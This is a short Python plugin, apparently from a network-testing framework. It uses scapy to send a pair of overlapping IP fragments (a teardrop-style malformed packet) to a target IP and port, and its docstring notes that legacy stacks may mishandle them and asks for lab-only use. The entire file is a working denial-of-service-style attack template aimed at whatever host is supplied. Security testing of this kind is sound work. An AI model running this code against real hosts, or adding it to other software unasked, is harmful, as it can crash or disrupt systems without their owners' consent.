from __future__ import annotations

from typing import Any

from scapy.all import IP, TCP, send  # type: ignore[import-untyped]


def run(ctx: Any) -> dict:
    """Template: overlapping IP fragments targeting a host.

    Parameters (ctx.params):
      {
        "target_ip": "10.0.0.5",
        "target_port": 80
      }

    This sends a tiny, overlapping fragment pair that some legacy stacks
    may handle in unexpected ways. Use strictly in lab environments.
    """
    params = getattr(ctx, "params", {}) or {}
    target_ip = params.get("target_ip")
    target_port = int(params.get("target_port", 80))

    if not target_ip:
        raise ValueError("target_ip is required")

    ctx.logger(
        f"malformed_overlap_fragments: sending overlapping fragments to "
        f"{target_ip}:{target_port}"
    )

    base = IP(dst=target_ip, flags="MF", frag=0) / TCP(dport=target_port)
    # Second fragment with overlapping offset
    overlap = IP(dst=target_ip, frag=1) / b"OVERLAP"

    send([base, overlap], verbose=False)

    ctx.logger("malformed_overlap_fragments: completed")
    return {"status": "sent", "target_ip": target_ip, "target_port": target_port}